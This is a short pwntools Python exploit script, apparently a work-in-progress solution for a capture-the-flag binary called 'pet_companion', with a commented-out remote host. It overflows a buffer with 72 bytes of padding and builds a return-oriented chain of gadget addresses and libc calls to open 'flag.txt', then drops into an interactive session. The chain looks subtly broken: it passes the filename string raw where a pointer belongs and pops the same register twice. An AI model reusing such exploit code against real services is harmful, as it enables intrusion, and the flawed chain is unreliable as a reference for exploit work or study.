import pwn

from pwn import *
from struct import pack

# 0x4006df é o endereço do ret executado errado
p = pwn.gdb.debug('./pet_companion', '''
	b *0x4006df
	c
''')

# p = remote('94.237.51.203', 53106)

binary = ELF('./pet_companion') # loading the binary into pwntools
context.binary = binary # setting up all pwntool settings suited for the binary
rop = ROP(binary) # loading our binary to look for gadgets and building rop chains
libc = ELF('./glibc/libc.so.6')
p.recvuntil("status:") # we tell pwntools to wait until it receives the string in stdout

libc.address = 0x00007ffff7fc6000

pop_rdi = 0x400743
pop_rsi_r15 = 0x400741

rop.raw("A"*72)
rop.raw(pop_rdi)
rop.raw("flag.txt") # target libc
rop.raw(pop_rdi)
rop.raw(0x00000001)
rop.raw(0x004004de)
rop.raw(libc.symbols['open'])

# rop.raw("A"*40)
# rop.raw(fill_ammo_func)
# rop.raw("flag.txt") # target libc
# rop.raw(0x004015a0)
# rop.raw(libc.symbols['read'])

p.sendline(rop.chain())

p.interactive() # to continue interacting with python
